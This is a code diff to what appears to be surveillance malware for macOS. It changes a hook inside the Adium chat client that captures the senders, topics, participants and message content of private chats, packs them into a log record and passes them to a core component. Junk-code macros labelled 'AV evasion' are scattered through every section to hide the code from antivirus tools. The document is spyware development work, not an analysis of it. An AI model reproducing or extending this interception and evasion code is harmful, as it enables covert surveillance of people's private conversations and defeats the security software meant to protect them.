@@ -16,13 +16,14 @@
  
 #import "RCSMAVGarbage.h"
 
-void adiumlogMessage(NSString *_sender, NSString *_topic, NSString *_peers, NSString *_message)
+void adiumlogMessage(NSString *_sender, NSString *_topic, NSString *_peers, NSString *_message, uint32 flags)
 {
+  int programType = 0x08; // adiumx
+  
   // AV evasion: only on release build
   AV_GARBAGE_002
   
-  NSData *processName         = [@"Adium" dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
-  NSData *topic               = [_topic dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
+  NSData *topic               = [_sender dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
   
   // AV evasion: only on release build
   AV_GARBAGE_004
@@ -40,6 +41,7 @@ void adiumlogMessage(NSString *_sender, NSString *_topic, NSString *_peers, NSSt
   AV_GARBAGE_006
   
   shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
+  
   short unicodeNullTerminator = 0x0000;
   
   // AV evasion: only on release build
@@ -82,15 +84,22 @@ void adiumlogMessage(NSString *_sender, NSString *_topic, NSString *_peers, NSSt
   // AV evasion: only on release build
   AV_GARBAGE_008
   
-  // Process Name
-  [entryData appendData: processName];
+  // Program type
+  [entryData appendBytes:&programType length:sizeof(programType)];
+  
+  // flags
+  [entryData appendBytes:&flags length:sizeof(flags)];
+    
+  // Topic
+  [entryData appendData: topic];
   
   // AV evasion: only on release build
-  AV_GARBAGE_006
+  AV_GARBAGE_004
   
   [entryData appendBytes: &unicodeNullTerminator
                   length: sizeof(short)];
-  // Topic
+  
+  // Topic_display
   [entryData appendData: topic];
   
   // AV evasion: only on release build
@@ -110,13 +119,15 @@ void adiumlogMessage(NSString *_sender, NSString *_topic, NSString *_peers, NSSt
   
   [entryData appendBytes: &unicodeNullTerminator
                   length: sizeof(short)];
-  // Content
-  [entryData appendData: [_sender dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
+  
+  // Peers_display
+  [entryData appendData: peers];
   
   // AV evasion: only on release build
-  AV_GARBAGE_001
+  AV_GARBAGE_000
   
-  [entryData appendData: [@": " dataUsingEncoding: NSUTF16LittleEndianStringEncoding]]; 
+  [entryData appendBytes: &unicodeNullTerminator
+                  length: sizeof(short)];
   
   // AV evasion: only on release build
   AV_GARBAGE_002
@@ -146,7 +157,7 @@ void adiumlogMessage(NSString *_sender, NSString *_topic, NSString *_peers, NSSt
   // AV evasion: only on release build
   AV_GARBAGE_001
   
-  shMemoryHeader->agentID         = AGENT_CHAT;
+  shMemoryHeader->agentID         = AGENT_CHAT_NEW;
   shMemoryHeader->direction       = D_TO_CORE;
   
   // AV evasion: only on release build
@@ -292,7 +303,7 @@ void adiumHookWrapper(id arg1, NSUInteger direction)
           // AV evasion: only on release build
           AV_GARBAGE_003
           
-          adiumlogMessage(src, topic, (NSString *)activeMembers, msgBuf);
+          adiumlogMessage(src, topic, (NSString *)activeMembers, msgBuf, direction);
           
           // AV evasion: only on release build
           AV_GARBAGE_001
